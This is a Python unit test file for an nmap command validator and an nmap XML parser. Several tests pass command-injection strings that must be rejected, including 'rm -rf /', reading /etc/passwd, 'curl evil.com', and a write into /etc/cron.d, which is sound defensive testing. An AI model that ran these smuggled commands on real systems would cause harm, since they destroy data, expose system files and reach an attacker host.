"""Unit tests for the nmap command validator and XML parser."""
import os
import sys
import textwrap
import tempfile
import pytest

# Make sure the backend package is importable from the tests directory
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from scanner import validate_nmap_command, parse_nmap_xml


# ── validate_nmap_command ─────────────────────────────────────────────────────

class TestValidateNmapCommand:

    def test_valid_basic(self):
        ok, msg = validate_nmap_command("nmap -sV 192.168.1.1")
        assert ok is True
        assert msg == ""

    def test_valid_sudo(self):
        ok, _ = validate_nmap_command("sudo nmap -O 10.0.0.1")
        assert ok is True

    def test_valid_with_flags(self):
        ok, _ = validate_nmap_command("nmap -A -T4 --script=vuln scanme.nmap.org")
        assert ok is True

    def test_valid_full_port(self):
        ok, _ = validate_nmap_command("nmap -p- --open -T4 192.168.1.0/24")
        assert ok is True

    def test_invalid_empty(self):
        ok, msg = validate_nmap_command("")
        assert ok is False
        assert "Empty" in msg

    def test_invalid_non_nmap(self):
        ok, msg = validate_nmap_command("ls -la /etc/passwd")
        assert ok is False
        assert "Only nmap" in msg

    def test_invalid_semicolon(self):
        ok, msg = validate_nmap_command("nmap -sV target; rm -rf /")
        assert ok is False
        assert ";" in msg

    def test_invalid_pipe(self):
        ok, msg = validate_nmap_command("nmap -sV target | cat /etc/passwd")
        assert ok is False

    def test_invalid_ampersand(self):
        ok, msg = validate_nmap_command("nmap -sV target && curl evil.com")
        assert ok is False

    def test_invalid_backtick(self):
        ok, msg = validate_nmap_command("nmap `whoami`")
        assert ok is False

    def test_invalid_dollar_paren(self):
        ok, msg = validate_nmap_command("nmap $(cat /etc/passwd)")
        assert ok is False

    def test_invalid_redirect(self):
        ok, msg = validate_nmap_command("nmap -sV target > /etc/cron.d/evil")
        assert ok is False

    def test_invalid_sudo_non_nmap(self):
        ok, msg = validate_nmap_command("sudo bash -c 'id'")
        assert ok is False

    def test_whitespace_stripped(self):
        ok, _ = validate_nmap_command("  nmap -sn 10.0.0.0/8  ")
        assert ok is True


# ── parse_nmap_xml ────────────────────────────────────────────────────────────

MINIMAL_XML = textwrap.dedent("""\
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE nmaprun>
    <nmaprun scanner="nmap" version="7.94" args="nmap -sV 127.0.0.1"
             startstr="Mon Jan  1 00:00:00 2024">
      <scaninfo type="connect" protocol="tcp" numservices="1000" services="1-1000"/>
      <host>
        <status state="up" reason="syn-ack"/>
        <address addr="127.0.0.1" addrtype="ipv4"/>
        <hostnames>
          <hostname name="localhost" type="PTR"/>
        </hostnames>
        <ports>
          <port protocol="tcp" portid="22">
            <state state="open" reason="syn-ack"/>
            <service name="ssh" product="OpenSSH" version="9.3p1"/>
          </port>
          <port protocol="tcp" portid="80">
            <state state="open" reason="syn-ack"/>
            <service name="http" product="Apache httpd" version="2.4.57"/>
          </port>
        </ports>
        <os>
          <osmatch name="Linux 5.4" accuracy="95">
            <osclass type="general purpose" vendor="Linux" osfamily="Linux"
                     osgen="5.X" accuracy="95"/>
          </osmatch>
        </os>
      </host>
      <runstats>
        <finished elapsed="1.23" summary="Nmap done" exit="success"
                  timestr="Mon Jan  1 00:00:01 2024"/>
        <hosts up="1" down="0" total="1"/>
      </runstats>
    </nmaprun>
    """)


@pytest.fixture()
def minimal_xml_path():
    """Write MINIMAL_XML to a temporary file and clean it up after the test."""
    tmp = tempfile.NamedTemporaryFile(suffix=".xml", delete=False, mode="w")
    tmp.write(MINIMAL_XML)
    tmp.close()
    yield tmp.name
    os.unlink(tmp.name)


class TestParseNmapXml:

    def test_top_level_keys(self, minimal_xml_path):
        result = parse_nmap_xml(minimal_xml_path)
        assert result["scanner"] == "nmap"
        assert result["version"] == "7.94"
        assert "hosts" in result
        assert "scan_info" in result
        assert "run_stats" in result

    def test_host_parsed(self, minimal_xml_path):
        result = parse_nmap_xml(minimal_xml_path)
        assert len(result["hosts"]) == 1
        host = result["hosts"][0]
        assert host["status"] == "up"
        assert any(a["addr"] == "127.0.0.1" for a in host["addresses"])
        assert any(hn["name"] == "localhost" for hn in host["hostnames"])

    def test_ports_parsed(self, minimal_xml_path):
        result = parse_nmap_xml(minimal_xml_path)
        ports = result["hosts"][0]["ports"]
        assert len(ports) == 2
        port_ids = {p["portid"] for p in ports}
        assert "22" in port_ids
        assert "80" in port_ids

    def test_service_parsed(self, minimal_xml_path):
        result = parse_nmap_xml(minimal_xml_path)
        ssh_port = next(p for p in result["hosts"][0]["ports"] if p["portid"] == "22")
        assert ssh_port["service"]["name"] == "ssh"
        assert ssh_port["service"]["product"] == "OpenSSH"

    def test_os_parsed(self, minimal_xml_path):
        result = parse_nmap_xml(minimal_xml_path)
        os_list = result["hosts"][0]["os"]
        assert len(os_list) == 1
        assert "Linux" in os_list[0]["name"]
        assert os_list[0]["accuracy"] == "95"

    def test_run_stats_parsed(self, minimal_xml_path):
        result = parse_nmap_xml(minimal_xml_path)
        stats = result["run_stats"]
        assert stats["hosts_up"] == "1"
        assert stats["elapsed"] == "1.23"

    def test_scan_info_parsed(self, minimal_xml_path):
        result = parse_nmap_xml(minimal_xml_path)
        assert len(result["scan_info"]) == 1
        si = result["scan_info"][0]
        assert si["type"] == "connect"
        assert si["protocol"] == "tcp"
